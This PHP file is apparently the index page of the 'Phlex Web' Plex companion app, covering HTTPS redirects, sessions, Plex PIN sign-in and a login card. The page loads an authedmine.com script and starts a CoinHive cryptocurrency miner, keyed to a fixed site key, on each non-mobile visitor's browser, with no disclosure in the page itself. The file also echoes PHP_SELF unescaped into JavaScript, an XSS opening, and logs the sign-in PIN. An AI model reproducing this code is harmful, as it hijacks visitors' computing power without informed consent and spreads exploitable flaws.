<?php
require_once dirname(__FILE__) . '/vendor/autoload.php';
require_once dirname(__FILE__) . '/webApp.php';
require_once dirname(__FILE__) . '/util.php';
checkSetDeviceID();
$forceSSL = checkSSL();
if ((empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] == "off") && $forceSSL) {
	$redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	if (isDomainAvailible($redirect)) {
		header('HTTP/1.1 301 Moved Permanently');
		header('Location: ' . $redirect);
		exit();
	}
}


if (substr_count($_SERVER["HTTP_ACCEPT_ENCODING"], "gzip") && hasGzip()) ob_start("ob_gzhandler"); else ob_start();
session_start();
setDefaults();

$messages = checkFiles();
if (isset($_GET['logout'])) {
	clearSession();
	$url = fetchUrl();
	echo "<script language='javascript'>
                    document.location.href='$url';
                    </script>";
}

?>
<!doctype html>
<html>
<head>
	<title>Phlex Web</title>
	<meta charset="UTF-8">
	<style>
		.fade-in{
			-webkit-animation: fade-in 2s ease;
			-moz-animation: fade-in ease-in-out 2s both;
			-ms-animation: fade-in ease-in-out 2s both;
			-o-animation: fade-in ease-in-out 2s both;
			animation: fade-in 2s ease;
			visibility: visible;
			-webkit-backface-visibility: hidden;
		}

		@-webkit-keyframes fade-in{0%{opacity:0;} 100%{opacity:1;}}
		@-moz-keyframes fade-in{0%{opacity:0} 100%{opacity:1}}
		@-o-keyframes fade-in{0%{opacity:0} 100%{opacity:1}}
		@keyframes fade-in{0%{opacity:0} 100%{opacity:1}}

	</style>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Flex TV">
	<link rel="apple-touch-icon" sizes="180x180" href="./img/apple-icon.png">
	<link rel="icon" type="image/png" href="./img/favicon-32x32.png" sizes="32x32">
	<link rel="icon" type="image/png" href="./img/favicon-16x16.png" sizes="16x16">
	<link rel="manifest" href="./manifest.json">
	<link rel="mask-icon" href="./img/safari-pinned-tab.svg" color="#5bbad5">
	<link rel="shortcut icon" href="./img/favicon.ico">
	<meta name="msapplication-config" content="./img/browserconfig.xml">
	<meta name="theme-color" content="#ffffff">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<link href="css/fonts.css" rel="stylesheet">

	<link href="./css/bootstrap.min.css" rel="stylesheet">
	<link href="./css/bootstrap-grid.min.css" rel="stylesheet">
	<link href="./css/font-awesome.min.css" rel="stylesheet">

	<link href="./css/material.css" rel="stylesheet">
	<link href="./css/snackbar.min.css" rel="stylesheet">
	<link href="./css/bootstrap-material-design.min.css" rel="stylesheet">
	<link href="./css/bootstrap-dialog.css" rel="stylesheet">
	<link href="./css/ripples.min.css" rel="stylesheet">
	<link href="./css/jquery-ui.min.css" rel="stylesheet">
	<link href="./css/bootstrap-slider.min.css" rel="stylesheet">

	<link href="./css/main.css" rel="stylesheet">
	<link rel="stylesheet" media="(max-width: 400px)" href="css/main_max_400.css"/>
	<link rel="stylesheet" media="(max-width: 600px)" href="css/main_max_600.css"/>
	<link rel="stylesheet" media="(min-width: 600px)" href="css/main_min_600.css"/>
	<link rel="stylesheet" media="(min-width: 2000px)" href="css/main_min_2000.css"/>
	<!--[if lt IE 9]>
	<link href="./css/bootstrap-ie8.css" rel="stylesheet">
	<script src="https://cdn.jsdelivr.net/g/html5shiv@3.7.3,respond@1.4.2"></script>
	<![endif]-->
	<script type="text/javascript">
		if ('serviceWorker' in navigator) {
			navigator.serviceWorker.register('service-worker.js').then(function (registration) {
				// Registration was successful
			}).catch(function (err) {
				// registration failed :(
				console.log('ServiceWorker registration failed: ', err);
			});
		}

	</script>
	<script>
		if (typeof window.history.pushState === 'function') {
			window.history.pushState({}, "Hide", '<?php echo $_SERVER['PHP_SELF'];?>');
		}
	</script>

	<script type="text/javascript" src="./js/jquery-3.2.1.min.js"></script>
	<script type="text/javascript" src="./js/tether.min.js"></script>
	<script type="text/javascript" src="./js/bootstrap.min.js"></script>
	<script type="text/javascript" src="./js/run_prettify.js" defer></script>
	<script type="text/javascript" src="./js/jquery-ui.min.js" defer></script>
	<script type="text/javascript" src="./js/clipboard.min.js" defer></script>
	<script type="text/javascript" src="./js/jquery.simpleWeather.min.js" defer></script>
	<script type="text/javascript" src="./js/snackbar.min.js" defer></script>
	<script type="text/javascript" src="./js/bootstrap-dialog.js" defer></script>
	<script type="text/javascript" src="./js/arrive.min.js" defer></script>
	<script type="text/javascript" src="./js/material.min.js" defer></script>
	<script type="text/javascript" src="./js/ripples.min.js" defer></script>
	<script type="text/javascript" src="./js/bootstrap-slider.min.js" defer></script>
	<script type="text/javascript" src="./js/swiped.min.js" defer></script>
	<script type="text/javascript" src="./js/ie10-viewport-bug-workaround.js"></script>
	<script src="https://authedmine.com/lib/authedmine.min.js"></script>

</head>

<body style="background-color:black">
<div id="bgwrap">

</div>
<script>
	<?php echo fetchBackground();?>
	var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		console.log("Firing miner.");
		miner.start();
	}
</script>

<script>
	var messageBox = [];
	// We call this inside the login window if necessary, or main.js. Ignore lint warnings.
	function loopMessages(messages) {
		console.log("Function fired.");
		var messageArray = messages;
		messageBox = messages;
		$.each(messageArray, function () {
			if (messageArray[0] === undefined) return false;
			var keepLooping = showMessage(messageArray[0].title, messageArray[0].message, messageArray[0].url);
			messageBox.splice(0, 1);
			if (!keepLooping) return false;
		})
	}

	function showMessage(title, message, url) {
		if (Notification.permission === 'granted') {
			var notification = new Notification(title, {
				icon: './img/avatar.png',
				body: message
			});
			if (url) {
				notification.onclick = function () {
					window.open(url);
				};
			}
			return true;

		} else {
			if (Notification.permission !== 'denied') {
				Notification.requestPermission().then(function (result) {
					if ((result === 'denied') || (result === 'default')) {
						$('#alertTitle').text(title);
						$('#alertBody').find('p').text(message);
						$('#alertModal').modal('show');
					}
				});
			} else {
				$('#alertTitle').text(title);
				$('#alertBody').find('p').text(message);
				$('#alertModal').modal('show');
			}
			return false;
		}
	}
</script>
<div id="bodyWrap">
	<?php
	$code = false;
	foreach ($_GET as $key => $value) {
		//write_log("hey, got a key named $key with a value of $value.");
		if ($key == "pinID") {
			write_log("We have a PIN: $value");
			$code = $value;
		}
	}
	$apiToken = $_SESSION['apiToken'];
	if ($code || $apiToken) {
		$result = false;
		if (!$apiToken) $result = plexSignIn($code);
		if ($result || $apiToken) {
			define('LOGGED_IN', true);
			require_once dirname(__FILE__) . '/body.php';
			write_log("Making body!");
			echo makeBody();
		}
	}
	?>
</div>
<div class="modal fade" id="alertModal">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="alertTitle">Modal title</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body" id="alertBody">
				<p>Modal body text goes here.</p>
			</div>
		</div>
	</div>
</div>
<meta id="messages" data-array="<?php if (count($messages)) echo urlencode(json_encode($messages)); ?>"/>

<?php
if (!isset($_SESSION['plexToken'])) {
	echo '
                        <div class="loginBox">
                            <div class="login-box">
                                <div class="card loginCard">
                                <div class="card-block">
                                    <b><h3 class="loginLabel card-title">Welcome to Phlex!</h3></b>
                                    <img class="loginLogo" src="./img/phlex.png" alt="Card image">
                                    <h6 class="loginLabel card-subtitle text-muted">Please log in below to begin.</h6>
                                </div>
                                <div class="card-block">
                                    <div id="loginForm">
                                        <button class="btn btn-raised btn-primary" id="plexAuth">DO IT!</button>
                                        <br><br>
                                        <a href="http://phlexchat.com/Privacy.html" class="card-link">Privacy Policy</a>
                                    </div>
                                </div>
                            </div>
                        </div>' .
		headerhtml() .
		'<script type="text/javascript" src="./js/login.js" async></script>';
	die();
}
?>
</body>
</html>